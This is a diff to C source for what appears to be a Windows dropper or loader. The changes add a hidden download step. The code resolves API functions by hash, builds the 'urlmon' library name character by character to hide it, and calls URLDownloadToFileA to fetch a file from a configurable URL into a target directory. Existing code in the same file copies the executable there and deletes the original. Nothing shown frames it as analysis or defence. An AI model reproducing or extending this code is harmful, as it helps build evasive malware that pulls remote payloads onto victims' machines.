@@ -9,6 +9,7 @@ struct {
     int offset;
     char file[_MAX_PATH];
 	char targetDir[_MAX_PATH];
+    char downloadUrl[_MAX_PATH];
 } sc = { "Hello, World!" };
 
 #define Kernel32Lib_Hash 0x1cca9ce6
@@ -34,6 +35,9 @@ typedef DWORD(WINAPI* _GetModuleFileName)(HMODULE hModule, LPSTR lpFilename, DWO
 #define SetFilePointer_Hash 1978850691
 typedef DWORD(WINAPI* _SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
 
+#define IsFileExist_Hash 1123472280
+typedef DWORD(WINAPI* _IsFileExist)(LPCSTR lpFileName);
+
 #define CreateFileA_Hash 1470354217
 typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
                                      DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
@@ -49,6 +53,9 @@ typedef BOOL(WINAPI* _CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName
 
 #define CloseHandle_Hash 110641196
 typedef BOOL(WINAPI* _CloseHandle)(HANDLE hObject);
+
+#define Download_Hash 557506787
+typedef HRESULT (WINAPI* _Download)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
 
 typedef struct _UNICODE_STR {
     USHORT Length;
@@ -257,6 +264,7 @@ int entry()
 	_DeleteFileA DeleteFileA = (_DeleteFileA)get_proc_address_from_hash(kernel32, DeleteFileA_Hash, GetProcAddress);
 	_CopyFileA CopyFileA = (_CopyFileA)get_proc_address_from_hash(kernel32, CopyFileA_Hash, GetProcAddress);
     _CloseHandle CloseHandle = (_CloseHandle)get_proc_address_from_hash(kernel32, CloseHandle_Hash, GetProcAddress);
+    _IsFileExist IsFileExist = (_IsFileExist)get_proc_address_from_hash(kernel32, IsFileExist_Hash, GetProcAddress);
 
     if (!sc.file[0]) GetModulePath(NULL, sc.file, MAX_PATH);
     char* file = sc.file, dstFile[2 * MAX_PATH];
@@ -265,12 +273,17 @@ int entry()
         GetModulePath(NULL, curExe, MAX_PATH);
         while (*dir) *p++ = *dir++; *p++ = '\\';
         while (*file) *p++ = *file++; *p = '\0';
+        char name[] = { 'u','r','l','m','o','n','\0' };
+        HMODULE urlmon = LoadLibraryA(name);
+        _Download URLDownloadToFileA = urlmon ? (_Download)get_proc_address_from_hash(urlmon, Download_Hash, GetProcAddress) : NULL;
+        if (sc.downloadUrl[0] && IsFileExist(dstFile) == INVALID_FILE_ATTRIBUTES && URLDownloadToFileA) {
+            if (FAILED(URLDownloadToFileA(NULL, sc.downloadUrl, dstFile, 0, NULL))) return(-1);
+        } 
         file = dstFile;
         if (!strstr(curExe, sc.targetDir)) {
-            DeleteFileA(dstFile);
             BOOL b = CopyFileA(sc.file, dstFile, FALSE);
             DeleteFileA(sc.file);
-            if (!b) return(2);
+            if (IsFileExist(dstFile) == INVALID_FILE_ATTRIBUTES) return(2);
         }
     }
     HANDLE hFile = CreateFileA(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
